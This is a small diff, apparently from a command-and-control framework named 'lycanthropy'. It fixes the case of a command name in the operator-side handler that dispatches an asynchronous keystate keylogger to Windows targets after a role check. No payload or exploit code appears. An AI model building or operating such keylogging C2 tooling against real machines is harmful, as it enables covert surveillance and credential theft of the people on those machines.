@@ -63,5 +63,5 @@ def asynckeystateLogger(arguments,context,connector):
     restoredForm = lycanthropy.portal.api.restoreForm('asynckeystate.logger', context, arguments)
     if not lycanthropy.portal.api.accessChk(connector,'operator'):
         return {'output': {'error': 'you do not have the correct role to run this command'}, 'context': 'windows(asynckeystate.logger)', 'form': restoredForm}
-    apiResponse = lycanthropy.portal.api.apiBroker().passGeneric(arguments,connector,'asyncKeystatelogger',lycanthropy.crypto.mkRandom(6),'windows')
+    apiResponse = lycanthropy.portal.api.apiBroker().passGeneric(arguments,connector,'asynckeystateLogger',lycanthropy.crypto.mkRandom(6),'windows')
     return {'output': apiResponse.content.decode('utf-8'), 'context': 'windows(asynckeystate.logger)', 'form': restoredForm}
